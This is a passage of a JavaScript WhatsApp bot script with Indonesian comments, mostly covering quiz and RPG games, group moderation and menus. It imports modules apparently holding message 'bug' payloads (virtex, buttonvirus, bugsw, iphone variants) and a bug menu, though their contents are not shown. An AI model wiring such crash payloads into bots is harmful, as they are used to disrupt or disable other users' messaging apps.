/*
// Buat Lu Yang Jual Sc Ini Yang Jujur Jangan Sampe Nipu 
   Apalagi Lari Dari Tanggung Jawab

// Base 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚Hw Mods : Copyan Dari Base Dika

› Create By 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚
› Base Ori 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚
› Copyan Base Dika haikal Morou

🌷 KALAU MAU RENAME TARO CREDITS GUA : 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚*/

//=================================================//
require('./hwkal')
require('./baseikal/lib/funclist')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { JSDOM } = require('jsdom')
const os = require('os')
const path = require('path')
const vm = require('node:vm')
const mel = require('kitsune-api')
const axios = require('axios')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const maker = require('mumaker')
const textpro = require('./baseikal/lib/textpro')
const speed = require('performance-now')
const { apikey } = require('./config.json')
const { performance } = require('perf_hooks')
const { exec, spawn, execSync } = require("child_process")
const { virtex, vipi } = require('./baseikal/virtex/virtex.js')
const { ngazap } = require('./baseikal/virtex/ngazap')
const { buttonvirus } = require('./baseikal/virtex/buttonvirus')
const { buttonkal } = require('./baseikal/virtex/buttonkal')
const { bugsw } = require('./baseikal/virtex/bugsw')
const { iphone } = require('./baseikal/virtex/iphone')
const { iphone1 } = require('./baseikal/virtex/iphone1')
const { iphone2 } = require('./baseikal/virtex/iphone2')
const { iphone3 } = require('./baseikal/virtex/iphone3')
const { iphone4 } = require('./baseikal/virtex/iphone4')
const { iphone5 } = require('./baseikal/virtex/iphone5')
const { iphone6 } = require('./baseikal/virtex/iphone6')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./baseikal/lib/list')
const { tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./baseikal/lib/myfunc')
//=================================================//
//LOGO MENTAHAN
const hw1 = fs.readFileSync ('./baseikal/logo/hw1.jpg')
const hw2 = fs.readFileSync ('./baseikal/logo/hw2.jpg')
const hw3 = fs.readFileSync ('./baseikal/logo/hw3.jpg')
const hw4 = fs.readFileSync ('./baseikal/logo/hw4.jpg')
const hw5 = fs.readFileSync ('./baseikal/logo/hw5.jpg')
const hw6 = fs.readFileSync ('./baseikal/logo/hw6.jpg')
const hw7 = fs.readFileSync ('./baseikal/logo/hw7.jpg')
const hw8 = fs.readFileSync ('./baseikal/logo/hw8.jpg')
const hw9 = fs.readFileSync ('./baseikal/logo/hw9.jpg')
const hw10 = fs.readFileSync ('./baseikal/logo/hw10.jpg')
const hw11 = fs.readFileSync ('./baseikal/logo/hw11.jpg')
const hw12 = fs.readFileSync ('./baseikal/logo/hw12.jpg')
const hw13 = fs.readFileSync ('./baseikal/logo/hw13.jpg')
const hw14 = fs.readFileSync ('./baseikal/logo/hw14.jpg')
const hw15 = fs.readFileSync ('./baseikal/logo/hw15.jpg')
const hw16 = fs.readFileSync ('./baseikal/logo/hw16.jpg')
const hw17 = fs.readFileSync ('./baseikal/logo/hw17.jpg')
const hw18 = fs.readFileSync ('./baseikal/logo/hw18.jpg')
const hw19 = fs.readFileSync ('./baseikal/logo/hw19.jpg')
const hw20 = fs.readFileSync ('./baseikal/logo/hw20.jpg')
const hw21 = fs.readFileSync ('./baseikal/logo/hw21.jpg')
const hw22 = fs.readFileSync ('./baseikal/logo/hw22.jpg')
const hw23 = fs.readFileSync ('./baseikal/logo/hw23.jpg')
const hw24 = fs.readFileSync ('./baseikal/logo/hw24.jpg')
const hw25 = fs.readFileSync ('./baseikal/logo/hw25.jpg')
const hw26 = fs.readFileSync ('./baseikal/logo/hw26.jpg')
const hw27 = fs.readFileSync ('./baseikal/logo/hw27.jpg')
const hw28 = fs.readFileSync ('./baseikal/logo/hw28.jpg')
const hw29 = fs.readFileSync ('./baseikal/logo/hw29.jpg')
const hw30 = fs.readFileSync ('./baseikal/logo/hw30.jpg')
const hw31 = fs.readFileSync ('./baseikal/logo/hw31.jpg')
const hw32 = fs.readFileSync ('./baseikal/logo/hw32.jpg')
const hw33 = fs.readFileSync ('./baseikal/logo/hw33.jpg')
const hw34 = fs.readFileSync ('./baseikal/logo/hw34.jpg')
const hw35 = fs.readFileSync ('./baseikal/logo/hw35.jpg')
const hw36 = fs.readFileSync ('./baseikal/logo/hw36.jpg')
const hw37 = fs.readFileSync ('./baseikal/logo/hw37.jpg')
const hw38 = fs.readFileSync ('./baseikal/logo/hw38.jpg')
const hw39 = fs.readFileSync ('./baseikal/logo/hw39.jpg')
const hw40 = fs.readFileSync ('./baseikal/logo/hw40.jpg')
const hw41 = fs.readFileSync ('./baseikal/logo/hw41.jpg')
const hw42 = fs.readFileSync ('./baseikal/logo/hw42.jpg')
const hw43 = fs.readFileSync ('./baseikal/logo/hw43.jpg')
const hw44 = fs.readFileSync ('./baseikal/logo/hw44.jpg')
const hw45 = fs.readFileSync ('./baseikal/logo/hw45.jpg')
const hw46 = fs.readFileSync ('./baseikal/logo/hw46.jpg')
const hw47 = fs.readFileSync ('./baseikal/logo/hw47.jpg')
const hw48 = fs.readFileSync ('./baseikal/logo/hw48.jpg')
const hw49 = fs.readFileSync ('./baseikal/logo/hw49.jpg')
const hw50 = fs.readFileSync ('./baseikal/logo/hw50.jpg')
const hw51 = fs.readFileSync ('./baseikal/logo/hw51.jpg')
const hw52 = fs.readFileSync ('./baseikal/logo/hw52.jpg')
const hw53 = fs.readFileSync ('./baseikal/logo/hw53.jpg')
const hw54 = fs.readFileSync ('./baseikal/logo/hw54.jpg')
const hw55 = fs.readFileSync ('./baseikal/logo/hw55.jpg')
const hw56 = fs.readFileSync ('./baseikal/logo/hw56.jpg')
const hw57 = fs.readFileSync ('./baseikal/logo/hw57.jpg')
const hw58 = fs.readFileSync ('./baseikal/logo/hw58.jpg')
const hw59 = fs.readFileSync ('./baseikal/logo/hw59.jpg')
const hw60 = fs.readFileSync ('./baseikal/logo/hw60.jpg')
const hw61 = fs.readFileSync ('./baseikal/logo/hw61.jpg')
const hw62 = fs.readFileSync ('./baseikal/logo/hw62.jpg')
const hw63 = fs.readFileSync ('./baseikal/logo/hw63.jpg')
const hw64 = fs.readFileSync ('./baseikal/logo/hw64.jpg')
const hw65 = fs.readFileSync ('./baseikal/logo/hw65.jpg')
const hw66 = fs.readFileSync ('./baseikal/logo/hw66.jpg')
const hw67 = fs.readFileSync ('./baseikal/logo/hw67.jpg')
const hw68 = fs.readFileSync ('./baseikal/logo/hw68.jpg')
const hw69 = fs.readFileSync ('./baseikal/logo/hw69.jpg')
const hw70 = fs.readFileSync ('./baseikal/logo/hw70.jpg')
const hw71 = fs.readFileSync ('./baseikal/logo/hw71.jpg')
const hw72 = fs.readFileSync ('./baseikal/logo/hw72.jpg')
const hw73 = fs.readFileSync ('./baseikal/logo/hw73.jpg')
const hw74 = fs.readFileSync ('./baseikal/logo/hw74.jpg')
const hw75 = fs.readFileSync ('./baseikal/logo/hw75.jpg')
const hw76 = fs.readFileSync ('./baseikal/logo/hw76.jpg')
const hw77 = fs.readFileSync ('./baseikal/logo/hw77.jpg')
const hw78 = fs.readFileSync ('./baseikal/logo/hw78.jpg')
const hw79 = fs.readFileSync ('./baseikal/logo/hw79.jpg')
// COMMAND GUA SULITIN
const { menu } = require('./baseikal/command/menu/menu')
const { bugmenu } = require('./baseikal/command/bugmenu/bugmenu')
const { allmenu } = require('./baseikal/command/allmenu/allmenu')
const { textmaker } = require('./baseikal/command/textmaker/textmaker')
const { game } = require('./baseikal/command/game/game')
const { mediafireDl } = require('./baseikal/lib/mediafire.js')
const thumbnail = fs.readFileSync ('./baseikal/image/mamak.jpg')
const ntilink = JSON.parse(fs.readFileSync("./baseikal/lib/antilink.json"))
const pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'))
const banned = JSON.parse(fs.readFileSync('./baseikal/dbnye/banned.json'))
const dblist = JSON.parse(fs.readFileSync('./database/listall.json'))
virgam = fs.readFileSync(`./baseikal/image/deden.jpeg`)
//=================================================//
//RPG FUNCTION
const { 
addInventoriDarah,cekDuluJoinAdaApaKagaDiJson,addDarah,kurangDarah, getDarah 
}= require('./src/darah.js')
const { 
cekInventoryAdaAtauGak,addInventori, addBesi, addEmas, addEmerald,addUmpan,addPotion,kurangBesi, kurangEmas, kurangEmerald, kurangUmpan,kurangPotion,getBesi, getEmas, getEmerald, getUmpan, getPotion
} = require('./src/alat_tukar.js')
const {addInventoriMonay,cekDuluJoinAdaApaKagaMonaynyaDiJson,addMonay,kurangMonay, getMonay 
} = require('./src/monay.js')
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit, getLimit 
} = require('./src/limit.js')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam,addKelinci,addDomba,addSapi, addGajah, kurangIkan, kurangAyam,kurangKelinci,kurangDomba,kurangSapi, kurangGajah, getIkan, getAyam,getKelinci,getDomba,getSapi, getGajah
} = require('./src/buruan.js')
let DarahAwal =global.rpg.darahawal
const isDarah = cekDuluJoinAdaApaKagaDiJson(m.sender)
const isCekDarah = getDarah(m.sender)
const isUmpan = getUmpan(m.sender)
const isPotion = getPotion(m.sender)
const isIkan = getIkan(m.sender)
const isAyam = getAyam(m.sender)
const isKelinci = getKelinci(m.sender)
const isDomba = getDomba(m.sender)
const isSapi = getSapi(m.sender)
const isGajah = getGajah(m.sender)
const isMonay = getMonay(m.sender)
const isLimit = getLimit(m.sender)
const isBesi = getBesi(m.sender)
const isEmas = getEmas(m.sender)
const isEmerald = getEmerald(m.sender)
const isInventory = cekInventoryAdaAtauGak(m.sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
const ikan = ['🐟','🐠','🐡']
//=================================================//
//RPG DATABASE
let _buruan = JSON.parse(fs.readFileSync('./src/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./src/darah.json'))
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
//=================================================//
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//=================================================//
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
moment.tz.setDefault("Asia/Jakarta").locale("id");
//=================================================//
module.exports = haikal = async (haikal, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
var chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        
//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = haikal.user.id ? haikal.user.id.split(":")[0]+"@s.whatsapp.net" : haikal.user.id
const isCreator = [haikal.user.id, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const isBan = banned.includes(m.sender)
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await haikal.groupMetadata(m.chat).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const welcm = m.isGroup ? wlcm.includes(from) : false
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const AntiNsfww = m.isGroup ? ntnsfww.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : true
const content = JSON.stringify(m.message)
const isPrem = prem.includes(sender)
const isUser = pendaftar.includes(sender)
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"

//=================================================//
const deploy = (teks) => {
  haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
const reply = (teks) => {
return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/7b3c0ac03dab420c5c12b.jpg',"thumbnail": thumb,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m})} 
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
//=================================================//
if (!haikal.public) {
if (!m.key.fromMe) return
}
if (isCmd && !isUser) {
pendaftar.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
}
let rn = ['recording','composing']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
haikal.sendPresenceUpdate(jd, from)
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', time, chalk.
green(budy || m.mtype), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
 }
//=================================================// 
//=================================================// 
var sticWait = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/wait.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticAdmin = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/BotAdman.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticOwner = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/owner.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticSukses = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/SuksesCok.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticBanLu = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/BanLu.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var groupon = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/groupon.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var SiGroupadmin = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/SiGroupadmin.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
//=================================================//
//=================================================//
// AntiLink
if (AntiLink) {
linkgce = await haikal.groupInviteCode(from)
if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
m.reply(`「 Detect Link 」\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(m.text)) {
bvl = `「 Detect Link 」\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await haikal.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
haikal.sendMessage(from, {text:`「 Detect Link 」\n\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: haikal.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, haikal.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
haikal.ev.emit('messages.upsert', msg)
}
if (('family100'+m.chat in _family100) && isCmd) {
    kuis = true
    let room = _family100['family100'+m.chat]
    let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
    let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
    if (!isSurender) {
let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
if (room.terjawab[index]) return !0
room.terjawab[index] = m.sender
    }
    let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
    let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
    haikal.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
    if (isWin || isSurender) delete _family100['family100'+m.chat]
}
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebaklagu[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await m.reply(`🎮 Kuis Matematika🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
delete kuismath[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebakgambar[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}
if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebakkata[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}
if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebakkalimat[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebaklirik[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebaktebakan[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}
//TicTacToe
    this.game = this.game ? this.game : {}
    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
    if (room) {
    let ok
    let isWin = !1
    let isTie = !1
    let isSurrender = !1
    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
    isSurrender = !/^[1-9]$/.test(m.text)
    if (m.sender !== room.game.currentTurn) { // nek wayahku
    if (!isSurrender) return !0
    }
    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
    m.reply({
    '-3': 'Game telah berakhir',
    '-2': 'Invalid',
    '-1': 'Posisi Invalid',
    0: 'Posisi Invalid',
    }[ok])
    return !0
    }
    if (m.sender === room.game.winner) isWin = true
    else if (room.game.board === 511) isTie = true
    let arr = room.game.render().map(v => {
    return {
    X: '❌',
    O: '⭕',
    1: '1️⃣',
    2: '2️⃣',
    3: '3️⃣',
    4: '4️⃣',
    5: '5️⃣',
    6: '6️⃣',
    7: '7️⃣',
    8: '8️⃣',
    9: '9️⃣',
    }[v]
    })
    if (isSurrender) {
    room.game._currentTurn = m.sender === room.game.playerX
    isWin = true
    }
    let winner = isSurrender ? room.game.currentTurn : room.game.winner
    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
    if (room.x !== room.o) await haikal.sendText(room.x, str, m, { mentions: parseMention(str) } )
    await haikal.sendText(room.o, str, m, { mentions: parseMention(str) } )
    if (isTie || isWin) {
    delete this.game[room.id]
    }
    }

//Suit PvP
    this.suit = this.suit ? this.suit : {}
    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
    if (roof) {
    let win = ''
    let tie = false
    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
    haikal.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
    delete this.suit[roof.id]
    return !0
    }
    roof.status = 'play'
    roof.asal = m.chat
    clearTimeout(roof.waktu)
    //delete roof[roof.id].waktu
    haikal.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
